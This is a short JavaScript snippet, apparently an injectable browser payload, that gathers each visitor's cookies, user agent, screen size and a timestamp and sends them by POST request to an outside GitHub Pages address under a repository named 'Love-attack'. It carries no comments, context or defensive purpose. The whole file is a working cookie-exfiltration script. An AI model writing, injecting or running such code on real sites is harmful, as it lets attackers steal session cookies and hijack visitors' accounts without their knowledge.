(function () {
    var data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screen: screen.width + "x" + screen.height,
        cookies: document.cookie
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://rainbowwalker77.github.io/Love-attack/dump.json", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
})();